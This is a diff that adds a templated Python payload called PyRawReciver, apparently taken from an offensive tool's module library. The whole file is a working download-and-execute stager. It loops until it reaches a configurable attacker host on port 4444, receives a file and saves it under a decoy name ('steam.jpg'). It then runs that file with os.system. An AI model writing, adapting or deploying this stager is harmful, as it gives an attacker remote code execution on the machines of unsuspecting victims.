@@ -1,0 +1,77 @@
+#!name##PyRawReciver
+#!itemType##payload
+#!lang##python
+#!info##A simple Python script. It connects to a server, receives a file, executes it, and then disconnects. It will keep trying to connect and download the file until it succeeds. Designed to work perfectly with a ‘deliver’-type server.
+#!itemTags##LW##PyS
+#!modProcess##BUILD_CODE
+#!Var##PRR_ip##$IP_ADDR##Host ip address##str
+#!Var##PRR_port##4444##Host port number##str
+#!Var##PRR_pause##3##Pause in sec between connect attempt.##str
+#!Var##PRR_fname##steam.jpg##Name of file after downloading##str
+
+
+import socket
+import os
+from time import sleep
+
+
+class PyRawReciver:
+    def __init__(self):
+        self.tpath = os.path.join(os.getcwd(), "{{PRR_fname}}")
+        self.raw_len = 1024
+    
+    def conn(self):
+        try:
+            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.client.connect(("{{PRR_ip}}", {{PRR_port}}))
+            return True
+        except:
+            return False
+    
+    def recive(self):
+        data = b""
+        while True:
+            try:
+                recv = self.client.recv(self.raw_len)
+                if recv:
+                    if len(recv) < self.raw_len:
+                        data += recv
+                        break
+                    else:
+                        data += recv
+                else:
+                    if len(data) > 0:
+                        break
+                    else:
+                        return None
+            except:
+                return None
+        try:
+            with open(self.tpath, "wb") as file:
+                file.write(data)
+            return True
+        except:
+            return None
+    
+    def execute(self):
+        try:
+            os.system(self.tpath)
+        except:
+            pass
+    
+    def start(self):
+        while True:
+            if not self.conn():
+                sleep({{PRR_pause}})
+                continue
+            if self.recive():
+                self.execute()
+                break
+            else:
+                self.client.close()
+                sleep({{PRR_pause}})
+
+        self.client.close()
+
+
+PyRawReciver().start()
